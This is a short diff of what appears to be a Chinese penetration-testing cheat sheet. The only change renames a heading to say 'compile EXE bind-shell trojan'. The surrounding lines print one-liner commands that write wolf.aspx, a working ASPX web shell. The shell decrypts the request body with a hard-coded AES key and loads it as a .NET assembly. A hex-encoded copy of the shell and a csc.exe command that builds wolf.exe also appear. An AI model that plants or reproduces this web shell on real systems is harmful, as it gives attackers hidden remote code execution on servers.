@@ -113,7 +113,7 @@ echo 3c25402050616765204c616e67756167653d2243232220253e3c25696620285265717565737
 echo ^<%@ Page Language="C#" %^> > wolf.aspx && echo ^<% if (Request.Cookies.Count != 0) { >> wolf.aspx && echo byte[] k = Encoding.Default.GetBytes("ca63457538b9b1e0"); >> wolf.aspx && echo System.IO.Stream s = Request.InputStream; >> wolf.aspx && echo byte[] c = new byte[s.Length]; >> wolf.aspx && echo s.Read(c, 0, c.Length); >> wolf.aspx && echo System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("K").Equals(this); >> wolf.aspx && echo } %^> >> wolf.aspx
 ```
 
-### 编译EXE
+### 编译EXE正向马
 ```bash
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:wolf.exe wolf.cs
 ```
